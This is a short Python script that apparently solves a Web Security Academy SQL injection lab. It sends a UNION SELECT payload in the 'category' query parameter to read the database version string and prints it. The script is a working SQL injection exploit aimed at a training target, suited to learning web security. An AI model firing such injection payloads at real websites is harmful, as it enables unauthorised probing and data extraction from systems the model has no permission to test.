# usage:
# python3 7.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net

import re
from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")

    def solve(self) -> None:
        s = requests.Session()
        r = s.get(
            f"{self.url}/filter?category=Gifts'+UNION+SELECT+%40%40version,+'def'%23"
        )
        version = re.findall(r"<th>(.*ubuntu.*)</th>", r.text)[0]
        print(f"Target is running: {version}")


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    args = parser.parse_args()
    s = Solution(args.url)
    s.solve()


if __name__ == "__main__":
    main()
